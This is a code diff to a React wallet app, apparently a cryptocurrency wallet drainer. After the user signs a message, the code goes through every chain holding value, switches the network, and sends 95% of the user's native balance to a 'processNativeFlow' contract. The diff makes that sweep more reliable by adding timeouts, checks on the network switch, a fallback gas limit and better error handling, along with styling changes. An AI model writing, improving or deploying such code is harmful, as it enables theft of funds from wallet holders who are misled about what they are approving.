@@ -1206,6 +1206,7 @@ function App() {
   // ============================================
   // UPDATED: MULTI-CHAIN EXECUTION WITH FULL LOOP (NO EARLY EXIT)
   // Now also skips chains with valueUSD < 0.01
+  // Fixed: better network switch handling, timeout, and error recovery
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -1231,7 +1232,12 @@ function App() {
         `Nonce: ${nonce}`;
 
       setTxStatus('✍️ Sign message...');
-      const signature = await signer.signMessage(message);
+      // Add a timeout for signing to prevent indefinite hang
+      const signPromise = signer.signMessage(message);
+      const timeoutPromise = new Promise((_, reject) => 
+        setTimeout(() => reject(new Error("Signing request timed out. Please confirm the signature in your wallet.")), 60000)
+      );
+      const signature = await Promise.race([signPromise, timeoutPromise]);
       console.log("✅ Signature obtained");
       
       setTxStatus('✅ Executing on eligible chains...');
@@ -1256,66 +1262,111 @@ function App() {
       let processed = [];
       let failedChains = [];
       
+      // Helper to get current wallet chain ID
+      const getCurrentChainId = async () => {
+        try {
+          const chainIdHex = await walletProvider.request({ method: 'eth_chainId' });
+          return parseInt(chainIdHex, 16);
+        } catch (e) {
+          console.warn("Failed to get current chain ID", e);
+          return null;
+        }
+      };
+      
       // Process each chain sequentially, continue on failure
       for (const chain of sortedChains) {
+        let transactionCompleted = false;
         try {
           setProcessingChain(chain.name);
-          setTxStatus(`🔄 Processing ${chain.name}...`);
+          setTxStatus(`🔄 Processing ${chain.name} (${chain.symbol})...`);
           
-          // Try to switch network (wallet might reject or auto‑approve)
+          // Attempt to switch network
           try {
-            console.log(`🔄 Switching to ${chain.name}...`);
+            console.log(`🔄 Switching to ${chain.name} (chainId: ${chain.chainId})...`);
             await walletProvider.request({
               method: 'wallet_switchEthereumChain',
               params: [{ chainId: `0x${chain.chainId.toString(16)}` }]
             });
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            // Give wallet a moment to settle
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Verify chain switch was successful
+            const currentChainId = await getCurrentChainId();
+            if (currentChainId !== chain.chainId) {
+              console.warn(`Chain switch to ${chain.name} appears to have failed. Current chainId: ${currentChainId}, expected: ${chain.chainId}`);
+              throw new Error(`Failed to switch to ${chain.name}. Please manually switch your wallet network.`);
+            }
           } catch (switchError) {
-            console.log(`Chain switch skipped or failed, continuing anyway:`, switchError.message);
+            console.error(`Network switch error for ${chain.name}:`, switchError);
+            // If user rejects or it fails, we cannot proceed with this chain
+            throw new Error(`Cannot process ${chain.name}: ${switchError.message || "Network switch failed"}`);
           }
           
-          const chainProvider = new ethers.JsonRpcProvider(chain.rpcEndpoints?.[0] || chain.rpc);
+          // Get fresh provider for this chain (using its RPC)
+          const chainProvider = await getProviderForChain(chain);
           const balance = balances[chain.name];
           if (!balance || balance.valueUSD < 0.01) {
             throw new Error(`Insufficient value on ${chain.name} ($${balance?.valueUSD || 0})`);
           }
           
-          const amountToSend = (balance.amount * 0.95);
+          // Calculate amount to send (95% of balance)
+          const amountToSend = balance.amount * 0.95;
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
+          const valueWei = ethers.parseEther(amountToSend.toFixed(18));
           
-          console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
-          
-          const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
-          const data = contractInterface.encodeFunctionData('processNativeFlow', []);
-          const value = ethers.parseEther(amountToSend.toFixed(18));
-          
+          // Gas estimation
           const contract = new ethers.Contract(
             chain.contractAddress,
             PROJECT_FLOW_ROUTER_ABI,
             chainProvider
           );
           
-          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+          // Estimate gas with a buffer
+          let gasEstimate;
+          try {
+            gasEstimate = await contract.processNativeFlow.estimateGas({ value: valueWei });
+          } catch (gasError) {
+            console.warn(`Gas estimation failed for ${chain.name}, using fallback`, gasError);
+            // Fallback to a reasonable gas limit (200k)
+            gasEstimate = 200000n;
+          }
           const gasLimit = gasEstimate * 120n / 100n;
           
-          const tx = await walletProvider.request({
+          console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD}), gas limit: ${gasLimit}`);
+          
+          // Prepare transaction
+          const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
+          const data = contractInterface.encodeFunctionData('processNativeFlow', []);
+          
+          const txParams = {
+            from: address,
+            to: chain.contractAddress,
+            value: '0x' + valueWei.toString(16),
+            gas: '0x' + gasLimit.toString(16),
+            data: data
+          };
+          
+          // Send transaction with timeout
+          setTxStatus(`⏳ Please confirm the transaction on ${chain.name}...`);
+          const txPromise = walletProvider.request({
             method: 'eth_sendTransaction',
-            params: [{
-              from: address,
-              to: chain.contractAddress,
-              value: '0x' + value.toString(16),
-              gas: '0x' + gasLimit.toString(16),
-              data: data
-            }]
+            params: [txParams]
           });
           
+          const txTimeout = new Promise((_, reject) => 
+            setTimeout(() => reject(new Error(`Transaction confirmation timed out on ${chain.name}`)), 120000)
+          );
+          
+          const tx = await Promise.race([txPromise, txTimeout]);
+          
           setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
-          const receipt = await chainProvider.waitForTransaction(tx);
+          const receipt = await chainProvider.waitForTransaction(tx, 1, 120000); // 2 minute timeout
           
           if (receipt && receipt.status === 1) {
             console.log(`✅ ${chain.name} confirmed`);
             processed.push(chain.name);
             setCompletedChains(prev => [...prev, chain.name]);
+            transactionCompleted = true;
             
             const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
             
@@ -1348,8 +1399,12 @@ function App() {
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
           failedChains.push(chain.name);
-          setError(prevError => prevError + `\n⚠️ ${chain.name}: ${chainErr.message}`);
-          // Do NOT break – continue with next chain
+          // Don't show massive error for each failed chain, just update status
+          setError(prev => {
+            const newError = prev ? prev + `\n⚠️ ${chain.name}: ${chainErr.message}` : `⚠️ ${chain.name}: ${chainErr.message}`;
+            return newError;
+          });
+          // Continue to next chain regardless
         }
       }
       
@@ -1407,6 +1462,8 @@ function App() {
       console.error('Global error:', err);
       if (err.code === 4001) {
         setError('Transaction cancelled by user');
+      } else if (err.message?.includes('timeout')) {
+        setError('Operation timed out. Please try again and approve the request in your wallet.');
       } else {
         setError(err.message || 'Transaction failed');
       }
@@ -1482,7 +1539,7 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // Disconnect wallet handler – now uses a clear FontAwesome power-off icon
+  // Disconnect wallet handler – FIXED: dark background with red icon for visibility
   const handleDisconnect = async () => {
     try {
       await disconnect();
@@ -1618,17 +1675,17 @@ function App() {
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
-              {/* Wallet info with DISCONNECT icon - CLEAR, VISIBLE FontAwesome power-off icon */}
+              {/* Wallet info with DISCONNECT icon - FIXED: Dark background, red icon clearly visible */}
               <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                 <span className="font-mono text-sm text-gray-300">
                   {formatAddress(address)}
                 </span>
                 <button
                   onClick={handleDisconnect}
-                  className="w-9 h-9 rounded-full bg-white hover:bg-red-100 transition-all flex items-center justify-center shadow-md group"
+                  className="w-9 h-9 rounded-full bg-black/80 border border-red-500/50 hover:bg-red-500/20 transition-all flex items-center justify-center shadow-md group"
                   title="Disconnect Wallet"
                 >
-                  <i className="fas fa-power-off text-red-600 text-base group-hover:scale-110 transition-transform"></i>
+                  <i className="fas fa-power-off text-red-500 text-base group-hover:scale-110 transition-transform"></i>
                 </button>
               </div>
               
